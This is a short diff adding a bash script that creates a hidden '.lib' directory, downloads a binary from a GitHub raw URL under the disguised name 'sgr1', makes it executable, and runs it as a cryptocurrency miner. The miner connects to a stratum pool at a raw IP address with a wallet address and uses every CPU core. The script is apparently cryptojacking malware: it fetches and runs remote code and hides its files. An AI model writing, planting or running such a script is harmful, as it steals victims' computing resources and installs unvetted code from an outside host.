@@ -1,0 +1,6 @@
+#!/bin/bash
+apt-get update
+mkdir .lib && cd .lib
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner
+chmod u+x sgr1
+./sgr1 -a aurum -o stratum+tcp://157.245.57.127:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.shit -p x -t $(nproc --all) 
